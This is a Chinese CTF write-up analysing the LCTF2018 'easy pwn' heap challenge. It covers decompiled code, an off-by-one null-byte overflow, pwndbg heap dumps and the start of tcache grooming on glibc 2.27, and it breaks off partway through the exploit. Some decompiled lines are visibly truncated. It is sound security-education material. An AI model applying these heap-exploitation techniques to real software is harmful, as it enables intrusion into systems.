# LCTF2018-easypwn-详细解析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
听说一血有pwnhub注册码拿就去试着打了一下周末的这场LCTF，结果作为签到题选手(笑)连签到题的一血都拿不到可能这就是命吧，不过遇到了一题不错的pwn，就详细的记录下解题思路和技巧吧
## easy pwn
先看下给的文件的基本信息
    ➜  easy_heap file easy_heap 
    easy_heap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped
    ➜  easy_heap checksec easy_heap 
    [*] '/home/Ep3ius/pwn/process/easy_heap/easy_heap'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
64位程序防护基本全开，接着我们ida看下程序反编译的结果
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      int choice; // eax
      init_0();
      chunk_menu = calloc(0xA0uLL, 1uLL);
      if ( !chunk_menu )
      {
        puts("init error!");
        exit_();
      }
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          choice = read_input();
          if ( choice != 2 )
            break;
          delete();
        }
        if ( choice > 2 )
        {
          if ( choice == 3 )
          {
            show();
          }
          else if ( choice == 4 )
          {
            exit_();
          }
        }
        else if ( choice == 1 )
        {
          new();
        }
      }
    }
我们可以看到这是一个基础的菜单型程序，这里比较在意的是程序先calloc了一个0xa0大小的堆块，我们先了解下malloc和
calloc的区别主要在于calloc在动态分配完内存后，自动初始化该内存空间为零，而malloc不初始化，里边数据是随机的垃圾数据。
    void new()
    {
      __int64 v0; // rbx
      __int64 idx; // [rsp+0h] [rbp-20h]
      int idxa; // [rsp+0h] [rbp-20h]
      unsigned int chunk_size; // [rsp+4h] [rbp-1Ch]
      unsigned __int64 v4; // [rsp+8h] [rbp-18h]
      v4 = __readfsqword(0x28u);
      LODWORD(idx) = 0;
      while ( idx  ", idx, v4);
        chunk_size = read_input();
        if ( chunk_size > 0xF8 )
          exit_();
        *(16LL * idxa + chunk_menu + 8) = chunk_size;
        printf("content n> ");
        read_input_content(*(16LL * idxa + chunk_menu), *(16LL * idxa + chunk_menu + 8));
      }
    }
我们可以看到可以new的chunk的数量是最多时10个，并且malloc的新chunk位置都是在开头calloc的chunk后面，并且content的输入方式单独写了个函数，我们跟进去看看
    void __fastcall read_input_content(_BYTE *input, int chunk_size)
    {
      unsigned int i; // [rsp+14h] [rbp-Ch]
      i = 0;
      if ( chunk_size )
      {
        while ( 1 )
        {
          read(0, &input[i], 1uLL);
          if ( chunk_size - 1  parseheap
    addr                prev                size                 status              fd                bk
    0x558c833fa000      0x0                 0x250                Used                None              None
    0x558c833fa250      0x0                 0xb0                 Used                None              None
    0x558c833fa300      0x0                 0x100                Used                None              None
    0x558c833fa400      0x0                 0x100                Used                None              None
    pwndbg> x/8x 0x558c833fa400
    0x558c833fa400:    0x0000000000000000    0x0000000000000101
    0x558c833fa410:    0x0000000062626262    0x0000000000000000
    0x558c833fa420:    0x0000000000000000    0x0000000000000000
    0x558c833fa430:    0x0000000000000000    0x0000000000000000
    # new(0xf8,'a'*0xf8)
    pwndbg> parseheap
    addr                prev                size                 status              fd                bk
    0x558c833fa000      0x0                 0x250                Used                None              None
    0x558c833fa250      0x0                 0xb0                 Used                None              None
    0x558c833fa300      0x0                 0x100                Freed 0x61616161616161610x6161616161616161
    0x558c833fa400      0x6161616161616161  0x100                Used                None              None
    pwndbg> x/8x 0x558c833fa400
    0x558c833fa400:    0x6161616161616161    0x0000000000000100  
我们可以看到chunk1的size位确实被x00所覆盖了，也证明确实只要size=0xf8就可以overwrite一字节到下一个chunk的size位
接着我们看下delete和show函数
    void delete()
    {
      unsigned int idx; // [rsp+4h] [rbp-Ch]
      printf("index n> ");
      idx = read_input();
      if ( idx > 9 || !*(16LL * idx + chunk_menu) )
        exit_();
      memset(*(16LL * idx + chunk_menu), 0, *(16LL * idx + chunk_menu + 8));
      free(*(16LL * idx + chunk_menu));
      *(16LL * idx + chunk_menu + 8) = 0;
      *(16LL * idx + chunk_menu) = 0LL;
    }
    void show()
    {
      unsigned int idx; // [rsp+4h] [rbp-Ch]
      printf("index n> ");
      idx = read_input();
      if ( idx > 9 || !*(16LL * idx + chunk_menu) )
        exit_();
      puts(*(16LL * idx + chunk_menu));
    }
中规中矩，没有什么问题
分析完了在这里卡了很久，后来在调题目给的libc时秉持着瞎猫一般是能碰到死耗子的原则查了下libc的版本，结果还真的找到了是2.27
要考虑tcache，马上切了个环境去调试(在这之前快被各种double free报错搞死了，哭)
我们先布局好7、8、9号堆
    new_tcache()
    new(0x10,'aaaa') #7
    new(0x10,'bbbb') #8
    new(0x10,'cccc') #9
    free_tcache()
    free(7)
    free(8)
    free(9)
然后下面的操作看上去可能会很绕但想明白了就很明了了，我们先把0-6从tcache取出new好7、8、9号堆后再放回tcache后把chunk7释放这时我们再看下chunk7的状态
    pwndbg> parseheap
    addr                prev                size                 status              fd                bk 
    0x564965142000      0x0                 0x250                Used                None              None
    0x564965142250      0x0                 0xb0                 Used                None              None
    0x564965142300      0x0                 0x100                Used                None              None
    0x564965142400      0x0                 0x100                Used                None              None